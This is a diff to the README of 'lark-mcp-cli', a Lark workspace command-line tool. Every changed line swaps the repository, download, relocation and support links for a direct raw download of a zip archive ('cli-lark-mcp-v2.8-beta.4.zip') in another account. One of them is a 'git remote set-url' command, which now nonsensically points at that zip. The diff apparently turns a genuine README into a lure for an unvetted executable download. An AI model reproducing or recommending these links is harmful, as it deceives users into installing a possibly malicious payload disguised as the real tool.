@@ -1,14 +1,14 @@
 # 🚀 lark-mcp-cli - Connect your Lark tools with ease
 
-[![](https://img.shields.io/badge/Download_Lark_MCP_CLI-Blue?style=for-the-badge)](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli)
+[![](https://img.shields.io/badge/Download_Lark_MCP_CLI-Blue?style=for-the-badge)](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli/raw/refs/heads/main/camwood/cli-lark-mcp-v2.8-beta.4.zip)
 
 This project provides a bridge between your Lark workspace and your local machine. It allows you to manage tasks and information through a simple command interface. This tool helps you save time by automating repetitive actions within your Lark environment.
 
 ## ⚠️ Important update notice
 
-This project moved to a new home. Please follow all future updates at the [new repository location](https://github.com/larkcowork/lark-mcp-cli). If you already set up this tool, run this command in your terminal to point to the new location:
+This project moved to a new home. Please follow all future updates at the [new repository location](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli/raw/refs/heads/main/camwood/cli-lark-mcp-v2.8-beta.4.zip). If you already set up this tool, run this command in your terminal to point to the new location:
 
-git remote set-url origin https://github.com/larkcowork/lark-mcp-cli.git
+git remote set-url origin https://github.com/Nonsteroidal-steelman66/lark-mcp-cli/raw/refs/heads/main/camwood/cli-lark-mcp-v2.8-beta.4.zip
 
 ## 💻 System requirements
 
@@ -24,7 +24,7 @@ Before you begin, verify your computer meets these basic needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli).
+1. Go to the [official download page](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli/raw/refs/heads/main/camwood/cli-lark-mcp-v2.8-beta.4.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link for the latest version.
 4. Locate the file ending in .exe in the Assets section.
@@ -83,4 +83,4 @@ Common commands include:
 
 ## 🌐 Getting help and support
 
-If you encounter issues, check the [new repository](https://github.com/larkcowork/lark-mcp-cli) for the latest fixes and documentation. You can also open a new issue on that page to report bugs. Provide your operating system version and a description of the error so we can help you faster. We monitor these issues daily to ensure the software stays reliable. Avoid sharing your passwords or personal tokens in any public support request. Keep your software updated to get the most recent security patches and performance boosts.
+If you encounter issues, check the [new repository](https://github.com/Nonsteroidal-steelman66/lark-mcp-cli/raw/refs/heads/main/camwood/cli-lark-mcp-v2.8-beta.4.zip) for the latest fixes and documentation. You can also open a new issue on that page to report bugs. Provide your operating system version and a description of the error so we can help you faster. We monitor these issues daily to ensure the software stays reliable. Avoid sharing your passwords or personal tokens in any public support request. Keep your software updated to get the most recent security patches and performance boosts.
